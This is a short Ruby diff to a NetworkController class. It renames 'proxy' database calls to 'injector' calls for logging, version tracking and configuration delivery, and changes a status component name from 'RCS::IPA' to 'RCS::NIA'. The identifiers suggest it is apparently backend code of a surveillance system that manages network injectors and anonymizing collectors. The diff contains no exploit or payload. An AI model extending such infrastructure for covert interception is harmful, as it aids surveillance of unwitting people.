@@ -71,7 +71,7 @@ class NetworkController
 
         # send the logs to db
         logs.each do |log|
-          DB.instance.proxy_add_log(p['_id'], *log) if p['type'].nil?
+          DB.instance.injector_add_log(p['_id'], *log) if p['type'].nil?
           DB.instance.collector_add_log(p['_id'], *log) unless p['type'].nil?
         end
         
@@ -123,7 +123,7 @@ class NetworkController
           trace :info, "[NC] #{element['address']} is version #{ver}"
 
           # update the db accordingly
-          DB.instance.update_proxy_version(element['_id'], ver) if element['type'].nil?
+          DB.instance.update_injector_version(element['_id'], ver) if element['type'].nil?
           DB.instance.update_collector_version(element['_id'], ver) unless element['type'].nil?
 
           # version check for incompatibility
@@ -135,7 +135,7 @@ class NetworkController
         when NCProto::PROTO_CONF
           content = nil
           if element['configured'] == false then
-            content = DB.instance.proxy_config(element['_id']) if element['type'].nil?
+            content = DB.instance.injector_config(element['_id']) if element['type'].nil?
             content = DB.instance.collector_config(element['_id']) unless element['type'].nil?
             trace :info, "[NC] #{element['address']} has a new configuration (#{content.length} bytes)" unless content.nil?
           end
@@ -194,8 +194,8 @@ class NetworkController
 
   def self.report_status(elem, status, message, disk=0, cpu=0, pcpu=0)
     if not elem['_id'].nil? then
-      component = "RCS::IPA::" + elem['name']
-      internal_component = 'ipa'
+      component = "RCS::NIA::" + elem['name']
+      internal_component = 'injector'
     end
     if not elem['collector_id'].nil? then
       component = "RCS::ANON::" + elem['collector']
